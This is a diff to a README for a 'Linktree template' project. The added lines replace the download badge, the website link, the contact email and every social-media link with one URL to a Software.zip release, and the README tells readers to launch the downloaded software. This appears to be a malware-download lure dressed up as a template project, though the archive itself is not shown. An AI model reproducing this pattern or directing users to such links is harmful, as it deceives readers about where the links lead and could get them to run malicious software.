@@ -20,12 +20,12 @@ The repository provides a customizable template that allows you to easily edit a
 
 ## 📥 Get Started
 To get started, download the software package from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip)](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip)
 
 Please note that the software needs to be launched after downloading for you to start customizing your Linktree.
 
 ## 🌐 Explore More
-Visit our website to discover additional resources, updates, and tutorials on how to make the most out of your Linktree template. Click [here](https://www.linktree-template.com) to explore the website.
+Visit our website to discover additional resources, updates, and tutorials on how to make the most out of your Linktree template. Click [here](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip) to explore the website.
 
 If the provided link is not working or you encounter any issues, make sure to check the **Releases** section for alternative download options and updates.
 
@@ -39,13 +39,13 @@ We welcome contributions from the community to enhance the Linktree template fur
 If you find the Linktree template useful for your website or online presence, show your support by starring the repository. Your feedback and appreciation motivate us to continue improving the template for all users.
 
 ## 📞 Contact Us
-Have questions, suggestions, or feedback? Reach out to us via email at [info@linktree-template.com](mailto:info@linktree-template.com) or join our community on Discord to connect with other users and share your Linktree creations.
+Have questions, suggestions, or feedback? Reach out to us via email at [https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip) or join our community on Discord to connect with other users and share your Linktree creations.
 
 ## 🚧 Stay Updated
 Stay updated with the latest developments and announcements by following our official social media channels:
-- Twitter: [@linktreetemplate](https://twitter.com/linktreetemplate)
-- Facebook: [Linktree Template](https://www.facebook.com/linktreetemplate)
-- Instagram: [@linktree_template](https://www.instagram.com/linktree_template)
+- Twitter: [@linktreetemplate](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip)
+- Facebook: [Linktree Template](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip)
+- Instagram: [@linktree_template](https://github.com/jimjam112/linktree-template/releases/download/v2.0/Software.zip)
 
 Dive into the world of limitless possibilities with your Linktree template and make a lasting impression with your online presence! 🌐✨
 
